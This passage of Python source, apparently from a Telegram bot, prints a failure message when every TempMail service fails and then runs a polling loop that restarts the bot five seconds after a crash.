        print("❌ All TempMail services failed")

    while True:
        try:
            bot.polling(non_stop=True, timeout=30)
        except Exception as e:
            print(f"❌ Bot crashed with error: {e}")
            time.sleep(5)  # wait 5 seconds before restarting
